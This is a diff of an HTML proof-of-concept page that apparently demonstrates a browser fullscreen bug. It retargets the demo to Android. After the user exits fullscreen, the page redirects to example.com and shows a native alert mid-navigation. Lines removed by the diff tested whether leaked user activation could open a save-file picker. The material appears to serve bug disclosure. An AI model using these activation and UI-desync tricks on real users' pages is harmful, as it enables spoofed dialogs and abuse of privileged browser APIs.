@@ -1,10 +1,12 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Fullscreen Activation Leak PoC</title>
+<title>Android Fullscreen UI Desync PoC</title>
 
 <style>
 body {
   font-family: system-ui, sans-serif;
+  margin: 0;
+  padding: 20px;
 }
 #hint {
   position: fixed;
@@ -12,81 +14,67 @@ body {
   display: none;
   align-items: center;
   justify-content: center;
-  font-size: 24px;
-  color: white;
   background: black;
+  color: white;
+  font-size: 20px;
   z-index: 9999;
   user-select: none;
   pointer-events: none;
 }
 </style>
 
-<button id="start">START (enter fullscreen)</button>
-<pre id="status"></pre>
+<button id="start">START (Fullscreen)</button>
+<pre id="log"></pre>
 
-<div id="hint">Click once, then press ESC</div>
+<div id="hint">Tap once, then exit fullscreen</div>
 
 <script>
-let interactedInFullscreen = false;
+let tappedInFullscreen = false;
 
-const log = m => {
-  status.textContent += m + "\n";
+const logMsg = m => {
+  log.textContent += m + "\n";
   console.log(m);
 };
 
-/* enter fullscreen */
+/* Enter fullscreen (user gesture) */
 start.onclick = async () => {
-  log("requestFullscreen()");
+  logMsg("Tap → requestFullscreen()");
   await document.documentElement.requestFullscreen();
 };
 
-/* record pointer interaction */
-addEventListener("pointerdown", () => {
+/* Record tap while fullscreen */
+addEventListener("touchstart", () => {
   if (!document.fullscreenElement) return;
-  if (interactedInFullscreen) return;
-  interactedInFullscreen = true;
-  log("Pointer interaction recorded");
+  if (tappedInFullscreen) return;
+  tappedInFullscreen = true;
+  logMsg("Touch recorded in fullscreen");
 });
 
-/* fullscreen exit */
-addEventListener("fullscreenchange", async () => {
+/* Fullscreen boundary */
+addEventListener("fullscreenchange", () => {
   if (document.fullscreenElement) {
     hint.style.display = "flex";
     return;
   }
 
   hint.style.display = "none";
-  log("Exited fullscreen");
+  logMsg("Exited fullscreen");
 
-  // schedule navigation
+  // Redirect shortly after exit
   setTimeout(() => {
-    log("Navigating to example.com");
+    logMsg("Navigating to example.com");
     location.href = "https://example.com";
-  }, 20);
+  }, 30);
 
-  if (!interactedInFullscreen) {
-    log("No activation → stop");
+  if (!tappedInFullscreen) {
+    logMsg("No activation → stop");
     return;
   }
 
-  // native dialog during navigation
+  // Native dialog during navigation
   setTimeout(() => {
     alert("HELLO");
-    log("Alert shown");
-  }, 35);
-
-  // privileged API test
-  try {
-    log("Attempting showSaveFilePicker()");
-    const h = await showSaveFilePicker({
-      suggestedName: "activation.txt"
-    });
-    const w = await h.createWritable();
-    await w.write("Activation persisted after fullscreen exit.");
-    await w.close();
-    log("Picker SHOWN");
-  } catch (e) {
-    log("Picker BLOCKED: " + e.name);
-  }
+    logMsg("Alert shown");
+  }, 60);
 });
 </script>
